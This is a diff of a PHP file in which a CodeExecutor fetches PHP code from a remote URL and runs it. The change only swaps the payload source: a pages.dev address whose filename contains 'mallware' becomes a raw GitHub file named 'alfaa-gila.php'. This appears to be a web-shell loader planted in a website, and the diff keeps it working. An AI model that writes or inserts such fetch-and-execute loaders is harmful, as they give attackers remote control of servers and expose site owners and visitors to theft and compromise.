@@ -98,7 +98,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://tameng-mallware.pages.dev/alfabadakmallware.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
